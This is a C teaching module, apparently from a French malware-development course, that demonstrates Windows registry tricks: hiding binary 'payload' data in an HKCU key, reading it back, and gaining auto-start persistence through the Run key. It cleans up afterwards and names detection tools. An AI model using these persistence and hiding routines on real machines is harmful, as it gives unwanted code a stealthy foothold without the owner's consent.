/*
 * ⚠️ AVERTISSEMENT STRICT
 * Techniques de malware development. Usage éducatif uniquement.
 *
 * Module 35 : Windows Registry Manipulation
 */

#include <windows.h>
#include <stdio.h>

// 1. Hide binary data in registry
int hide_data_registry(const char* key_path, const char* value_name, BYTE* data, DWORD size) {
    HKEY hkey;
    LONG result;

    result = RegCreateKeyExA(HKEY_CURRENT_USER, key_path, 0, NULL,
                              REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hkey, NULL);

    if (result != ERROR_SUCCESS) {
        printf("[-] RegCreateKeyEx failed (%ld)\n", result);
        return 0;
    }

    result = RegSetValueExA(hkey, value_name, 0, REG_BINARY, data, size);
    RegCloseKey(hkey);

    if (result == ERROR_SUCCESS) {
        printf("[+] Data hidden in registry: %s\\%s\n", key_path, value_name);
        return 1;
    } else {
        printf("[-] RegSetValueEx failed (%ld)\n", result);
        return 0;
    }
}

// 2. Read hidden data from registry
int read_data_registry(const char* key_path, const char* value_name, BYTE* buffer, DWORD* size) {
    HKEY hkey;
    LONG result;
    DWORD type;

    result = RegOpenKeyExA(HKEY_CURRENT_USER, key_path, 0, KEY_QUERY_VALUE, &hkey);

    if (result != ERROR_SUCCESS) {
        printf("[-] RegOpenKeyEx failed (%ld)\n", result);
        return 0;
    }

    result = RegQueryValueExA(hkey, value_name, NULL, &type, buffer, size);
    RegCloseKey(hkey);

    if (result == ERROR_SUCCESS) {
        printf("[+] Data read from registry: %ld bytes\n", *size);
        return 1;
    } else {
        printf("[-] RegQueryValueEx failed (%ld)\n", result);
        return 0;
    }
}

// 3. Persistence via Run key
int persist_run_key(const char* app_name, const char* app_path) {
    HKEY hkey;
    LONG result;

    result = RegOpenKeyExA(HKEY_CURRENT_USER,
                           "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                           0, KEY_SET_VALUE, &hkey);

    if (result != ERROR_SUCCESS) {
        printf("[-] RegOpenKeyEx failed (%ld)\n", result);
        return 0;
    }

    result = RegSetValueExA(hkey, app_name, 0, REG_SZ,
                            (const BYTE*)app_path, strlen(app_path) + 1);
    RegCloseKey(hkey);

    if (result == ERROR_SUCCESS) {
        printf("[+] Persistence installed: %s\n", app_name);
        return 1;
    } else {
        printf("[-] RegSetValueEx failed (%ld)\n", result);
        return 0;
    }
}

// 4. Delete registry value (cleanup)
void delete_registry_value(const char* key_path, const char* value_name) {
    HKEY hkey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, key_path, 0, KEY_SET_VALUE, &hkey) == ERROR_SUCCESS) {
        RegDeleteValueA(hkey, value_name);
        RegCloseKey(hkey);
        printf("[*] Deleted registry value: %s\\%s\n", key_path, value_name);
    }
}

int main() {
    printf("\n⚠️  AVERTISSEMENT : Techniques de registry manipulation malware dev\n");
    printf("   Usage éducatif uniquement. Tests VM isolées.\n\n");

    printf("=== WINDOWS REGISTRY MANIPULATION DEMO ===\n\n");

    // Get current executable path
    char current_exe[MAX_PATH];
    GetModuleFileNameA(NULL, current_exe, MAX_PATH);

    // Demo 1: Hide binary data
    printf("[1] Hiding Binary Data\n");
    BYTE payload[] = {0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE};
    hide_data_registry("SOFTWARE\\TestApp", "Config", payload, sizeof(payload));

    // Demo 2: Read hidden data
    printf("\n[2] Reading Hidden Data\n");
    BYTE buffer[256];
    DWORD size = sizeof(buffer);
    if (read_data_registry("SOFTWARE\\TestApp", "Config", buffer, &size)) {
        printf("[*] Data hex: ");
        for (DWORD i = 0; i < size; i++) {
            printf("%02X ", buffer[i]);
        }
        printf("\n");
    }

    // Demo 3: Persistence (Run key)
    printf("\n[3] Registry Persistence (Run Key)\n");
    persist_run_key("TestPersistence", current_exe);

    // Demo 4: Cleanup
    printf("\n[*] CLEANUP\n");
    delete_registry_value("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "TestPersistence");
    delete_registry_value("SOFTWARE\\TestApp", "Config");

    printf("\n[!] NOTES:\n");
    printf("- HKCU = user-level, pas admin requis\n");
    printf("- HKLM = system-level, nécessite admin\n");
    printf("- REG_BINARY = données binaires (payloads)\n");
    printf("- Run keys = persistence auto-start\n");
    printf("- Détection : Autoruns, Process Monitor, Sysmon\n");

    return 0;
}
